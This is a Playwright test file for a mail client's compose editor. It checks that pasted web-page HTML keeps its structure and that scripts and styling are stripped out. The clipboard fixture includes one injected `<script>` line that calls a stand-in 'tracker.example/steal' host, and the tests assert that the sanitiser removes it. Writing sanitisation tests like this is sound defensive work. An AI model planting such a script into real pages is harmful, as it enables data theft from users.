/**
 * Issue #671: pasting a web page into compose put its HTML source into the
 * message as characters. The old editor registered plugins for bold, italic,
 * link and blockquote only, so every other element collapsed on the way in.
 *
 * This drives a real clipboard event carrying a `text/html` flavour — a
 * heading, a list, a table, inline styling and a script — and then reads the
 * body back off the server. What compose autosaves is the message that goes on
 * the wire, so asserting on the outbox entry asserts on what a recipient
 * receives, not on what the editor claims about itself.
 */

import type { Page } from "@playwright/test";
import { waitFor } from "../src/api.js";
import { expect, test } from "../src/fixtures.js";

const AUTOSAVE_SETTLE_MS = 4_000;

const CLIPBOARD_HTML = [
	'<meta charset="utf-8">',
	'<h2 style="color:#c00;font-family:Verdana">Quarterly numbers</h2>',
	"<p>Highlights <strong>this quarter</strong>:</p>",
	'<ul><li style="margin:0">Revenue up</li><li>Costs flat</li></ul>',
	'<table style="border:2px dashed #c00"><thead>',
	"<tr><th>Region</th><th>Total</th></tr></thead>",
	"<tbody><tr><td>EMEA</td><td>412</td></tr></tbody></table>",
	'<script>fetch("https://tracker.example/steal")</script>',
].join("");

/** What the same clipboard carries in its text flavour, and what the bug inserted. */
const CLIPBOARD_TEXT = "Quarterly numbers Highlights this quarter:";

/**
 * A real clipboard event carrying both flavours. `withShift` replays the
 * keystroke that produced it, which is where the modifier lives — a
 * `ClipboardEvent` carries no modifier state of its own.
 */
const pasteHtml = (
	page: Page,
	{
		html,
		text,
		withShift = false,
	}: { html: string; text: string; withShift?: boolean },
): Promise<void> =>
	page.evaluate(
		([htmlFlavour, textFlavour, shift]) => {
			const target = document.querySelector('[data-testid="compose-body"]');
			if (!target) throw new Error("the compose body is not mounted");
			if (shift === "shift") {
				target.dispatchEvent(
					new KeyboardEvent("keydown", {
						bubbles: true,
						cancelable: true,
						key: "v",
						shiftKey: true,
						ctrlKey: true,
					}),
				);
			}
			const data = new DataTransfer();
			data.setData("text/html", htmlFlavour);
			data.setData("text/plain", textFlavour);
			target.dispatchEvent(
				new ClipboardEvent("paste", {
					bubbles: true,
					cancelable: true,
					clipboardData: data,
				}),
			);
		},
		[html, text, withShift ? "shift" : "plain"],
	);

test.describe("Pasting a web page into compose (#671)", () => {
	test.setTimeout(120_000);

	test("the pasted structure reaches the message, its markup does not", async ({
		api,
		page,
	}) => {
		const subject = `Paste ${Date.now()}`;

		await page.goto("/mail");
		await page.getByRole("button", { name: "Compose", exact: true }).click();

		const body = page.getByTestId("compose-body");
		await expect(body).toBeVisible({ timeout: 30_000 });

		await page.getByPlaceholder("Recipients").fill("ada@remit.test");
		await page.getByPlaceholder("Recipients").press("Enter");
		await page.locator("[data-subject-field]").fill(subject);

		await body.click();
		await pasteHtml(page, { html: CLIPBOARD_HTML, text: CLIPBOARD_TEXT });

		// The editor holds a document, not a string of markup.
		await expect(body.locator("table td", { hasText: "EMEA" })).toBeVisible();
		await expect(body.locator("h2")).toHaveText("Quarterly numbers");
		await expect(body.locator("ul li").first()).toHaveText("Revenue up");
		await expect(body).not.toContainText("<table");
		await expect(body).not.toContainText("<h2");

		await page.waitForTimeout(AUTOSAVE_SETTLE_MS);

		const drafts = await waitFor(
			() => api.listRemovableOutboxMessages(),
			(items) => items.some((item) => item.subject === subject),
			{ timeoutMs: 30_000, what: "the pasted draft to autosave" },
		);
		const draft = drafts.find((item) => item.subject === subject);
		if (!draft) throw new Error("unreachable: the draft was matched but lost");

		try {
			const saved = await api.getOutboxMessage(draft.outboxMessageId);
			const html = saved.htmlBody ?? "";
			const text = saved.textBody ?? "";

			expect(html).toContain("<table");
			expect(html).toContain("EMEA");
			expect(html).toContain("412");
			expect(html).toMatch(/<h2[^>]*>Quarterly numbers/);
			expect(html).toContain("<ul");
			expect(html).toContain("Revenue up");

			// The defect: the markup arrived as text, so the message carried its
			// escaped source instead of the structure.
			expect(html).not.toContain("&lt;table");
			expect(html).not.toContain("&lt;h2");

			// Adopted content is stripped of what a receiving client would rewrite,
			// and of anything that executes.
			expect(html).not.toContain("<script");
			expect(html).not.toContain("tracker.example");
			expect(html).not.toContain("color:#c00");
			expect(html).not.toContain("Verdana");

			// Nor of this app's own stylesheet, which the editor writes onto every
			// element it serializes and which means nothing to a recipient.
			expect(html).not.toContain('class="');
			expect(html).not.toContain("white-space");

			// The plain alternative is the same document as Markdown, so a
			// text-only reader gets a readable message rather than flattened
			// characters.
			expect(text).toContain("## Quarterly numbers");
			expect(text).toContain("- Revenue up");
		} finally {
			await api.deleteOutboxMessage(draft.outboxMessageId);
		}
	});

	test("holding Shift pastes the text flavour instead", async ({
		api,
		page,
	}) => {
		const subject = `Plain paste ${Date.now()}`;

		await page.goto("/mail");
		await page.getByRole("button", { name: "Compose", exact: true }).click();

		const body = page.getByTestId("compose-body");
		await expect(body).toBeVisible({ timeout: 30_000 });

		await page.getByPlaceholder("Recipients").fill("ada@remit.test");
		await page.getByPlaceholder("Recipients").press("Enter");
		await page.locator("[data-subject-field]").fill(subject);

		await body.click();
		await pasteHtml(page, {
			html: CLIPBOARD_HTML,
			text: CLIPBOARD_TEXT,
			withShift: true,
		});

		await expect(body.locator("table")).toHaveCount(0);
		await expect(body).toContainText(CLIPBOARD_TEXT);

		await page.waitForTimeout(AUTOSAVE_SETTLE_MS);

		const drafts = await waitFor(
			() => api.listRemovableOutboxMessages(),
			(items) => items.some((item) => item.subject === subject),
			{ timeoutMs: 30_000, what: "the plain-pasted draft to autosave" },
		);
		const draft = drafts.find((item) => item.subject === subject);
		if (!draft) throw new Error("unreachable: the draft was matched but lost");

		try {
			const saved = await api.getOutboxMessage(draft.outboxMessageId);
			expect(saved.htmlBody ?? "").not.toContain("<table");
			expect(saved.textBody ?? "").toContain("Quarterly numbers");
		} finally {
			await api.deleteOutboxMessage(draft.outboxMessageId);
		}
	});
});
